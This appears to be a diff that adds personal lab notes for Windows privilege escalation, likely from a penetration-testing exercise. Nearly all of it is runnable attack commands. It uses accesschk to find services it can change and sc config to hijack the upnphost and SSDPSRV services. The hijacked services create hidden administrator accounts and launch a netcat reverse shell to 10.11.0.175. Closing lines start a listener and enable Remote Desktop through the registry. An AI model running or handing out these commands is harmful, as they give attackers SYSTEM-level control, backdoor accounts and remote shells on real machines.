@@ -1,0 +1,50 @@
+accesschk.exe /accepteula -uwcqv IWAM_BOB * >ack1.txt
+
+
+
+sc config upnphost binpath= "net user btr1 Password1 /add"
+sc stop upnphost
+sc start upnphost
+sc config upnphost binpath= "net localgroup Administrators btr1 /add"
+sc stop upnphost
+
+sc start upnphost
+
+
+
+sc config SSDPSRV start= auto
+
+sc start SSDPSRV
+
+
+working:
+
+sc qc SSDPSRV
+
+sc config SSDPSRV binpath= "c:\Inetpub\Scripts\nc.exe -nv 10.11.0.175 9090 -e cmd.exe"
+
+sc config SSDPSRV obj= ".\LocalSystem" password= ""
+
+C:\Inetpub\Scripts>sc config SSDPSRV start= "demand"
+
+sc qc SSDPSRV
+net start SSDPSRV
+
+net user daya daya /add
+net localgroup administrators daya /add
+
+
+
+
+sc config SSDPSRV binpath= "net user daya daya /add"
+sc config SSDPSRV obj= ".\LocalSystem" password= ""
+C:\Inetpub\Scripts>sc config SSDPSRV start= "demand"
+sc qc SSDPSRV
+net start SSDPSRV
+nc -nlvp 9090 
+
+
+
+To enable Remote Desktop in Windows
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
